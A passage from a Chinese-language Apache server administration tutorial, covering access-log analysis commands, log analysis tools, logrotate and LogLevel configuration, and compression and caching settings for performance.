<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> awk</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -F</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'&quot;'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '{print $6}'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> uniq</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -rn</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> head</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -10</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查找404错误</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot; 404 &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查找5xx错误</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot; 50[0-9] &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 统计每小时的请求数</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> awk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '{print $4}'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> cut</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> uniq</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看慢请求（假设使用%D记录时间）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> awk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '$NF > 1000000 {print $0}'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 实时监控访问（彩色显示）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> awk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '{print &quot;\033[1;32m&quot;$1&quot;\033[0m&quot;, $7, &quot;\033[1;33m&quot;$9&quot;\033[0m&quot;}'</span></span></code></pre></figure>
<h3 id="4-使用日志分析工具">4. 使用日志分析工具<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-使用日志分析工具" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装GoAccess（实时日志分析工具）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> goaccess</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 实时终端分析</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> goaccess</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 生成HTML报告</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> goaccess</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/report.html</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --log-format=COMBINED</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 实时更新HTML报告</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> goaccess</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/report.html</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --log-format=COMBINED</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --real-time-html</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装AWStats（传统日志分析工具）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> awstats</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装Webalizer</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> webalizer</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span></code></pre></figure>
<h3 id="5-日志轮换配置">5. 日志轮换配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-日志轮换配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看当前配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/logrotate.d/apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 编辑日志轮换配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/logrotate.d/apache2</span></span></code></pre></figure>
<p><strong>日志轮换配置示例：</strong></p>
<pre><code>/var/log/apache2/*.log {
    daily                    # 每日轮换
    missingok               # 日志丢失不报错
    rotate 14               # 保留14个旧日志
    compress                # 压缩旧日志
    delaycompress          # 延迟压缩（下次轮换时压缩）
    notifempty             # 空日志不轮换
    create 640 root adm    # 创建新日志的权限
    sharedscripts          # 所有日志轮换完后执行一次脚本
    postrotate
        if systemctl is-active --quiet apache2 ; then \
            systemctl reload apache2 > /dev/null 2>&amp;1; \
        fi
    endscript
}
</code></pre>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 手动执行日志轮换</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> logrotate</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/logrotate.d/apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试日志轮换（不实际执行）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> logrotate</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/logrotate.d/apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看日志轮换状态</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/lib/logrotate/status</span></span></code></pre></figure>
<h3 id="6-错误日志级别">6. 错误日志级别<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-错误日志级别" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在apache2.conf或虚拟主机配置中设置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> warn              # 默认级别</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 可用级别（从低到高）：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># emerg  - 紧急情况</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># alert  - 立即采取行动</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># crit   - 严重情况</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># error  - 错误情况</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># warn   - 警告情况</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># notice - 正常但重要的情况</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># info   - 信息性消息</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># debug  - 调试信息</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># trace1-8 - 跟踪信息（非常详细）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 为特定模块设置日志级别</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> warn ssl:info rewrite:trace3</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 开发环境可以使用更详细的日志</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> info ssl:debug</span></span></code></pre></figure>
<h2 id="八性能优化">八、性能优化<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#八性能优化" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-启用压缩">1. 启用压缩<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-启用压缩" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用deflate模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> deflate</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置压缩规则</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/mods-available/deflate.conf</span></span></code></pre></figure>
<p><strong>压缩配置示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_deflate.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 压缩输出</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/plain</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/xml</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/css</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/javascript</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/json</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/xml</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/xhtml+xml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/rss+xml</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/atom+xml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">image/svg+xml</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/font-woff</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/font-woff2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 排除已压缩的文件类型</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    SetEnvIfNoCase</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Request_URI \.(?:gif|jpe?g|png|zip|gz|rar|bz2|pdf|mp3|mp4|avi)$ no-gzip</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 排除旧版浏览器</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    BrowserMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ^Mozilla/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> gzip-only-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    BrowserMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ^Mozilla/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">4</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">\.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">678</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">] no-gzip</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    BrowserMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> \bMSIE !no-gzip !gzip-only-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 确保代理正确处理</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> append Vary </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">User</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">-Agent env=!dont-vary</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="2-配置缓存">2. 配置缓存<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-配置缓存" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用缓存相关模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cache_disk</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> expires</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> headers</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<p><strong>缓存配置示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_expires.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresActive</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresDefault</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> month&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # HTML</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> hour&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # CSS和JavaScript</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/css</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/javascript</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/x-javascript</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 图片</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/jpeg</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/png</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/gif</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
